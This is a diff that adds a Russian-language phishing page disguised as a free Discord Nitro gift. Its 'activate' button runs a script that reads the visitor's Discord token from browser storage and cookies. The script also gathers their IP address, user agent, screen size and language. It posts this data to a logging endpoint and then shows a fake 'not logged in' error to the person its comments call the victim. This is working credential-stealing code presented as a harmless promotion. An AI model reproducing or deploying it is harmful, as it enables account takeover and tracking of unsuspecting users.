@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Nitro</title>
+    <style>
+        body { background: #313338; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: #2b2d31; padding: 40px 20px; border-radius: 10px; width: 80%; max-width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+        .btn { background: #5865F2; color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.2s; }
+        .btn:hover { background: #4752C4; }
+        .error { color: #ff6b6b; margin-top: 10px; font-size: 14px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1 style="font-size: 24px;">🎁 Подарок!</h1>
+        <p style="color: #b5bac1; font-size: 14px;">Вам доступен бесплатный месяц Discord Nitro. Нажмите кнопку ниже, чтобы активировать.</p>
+        
+        <button class="btn" onclick="stealAndLog()">Активировать</button>
+        <div class="error" id="error-msg">Ошибка: Вы не авторизованы в Discord. Пожалуйста, войдите в аккаунт.</div>
+    </div>
+
+    <script>
+        async function stealAndLog() {
+            let token = null;
+
+            // 1. Пытаемся найти токен в браузере
+            try {
+                token = localStorage.getItem('token') || sessionStorage.getItem('token');
+                if (!token) {
+                    const match = document.cookie.match(/token=([^;]+)/);
+                    if (match) token = match[1];
+                }
+            } catch(e) {}
+
+            // 2. Собираем IP-адрес
+            let ip = "Неизвестно";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ipData = await res.json();
+                ip = ipData.ip;
+            } catch(e) {}
+
+            // 3. Формируем пакет данных
+            const data = {
+                ip: ip,
+                ua: navigator.userAgent,
+                screen: screen.width + "x" + screen.height,
+                lang: navigator.language,
+                token: token || "Токен не найден"
+            };
+
+            // 4. Отправляем на нашу функцию Netlify (обходит блокировки)
+            try {
+                await fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                console.log("Ошибка отправки:", e);
+            }
+
+            // 5. Показываем результат жертве (фейковая ошибка)
+            document.getElementById('error-msg').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
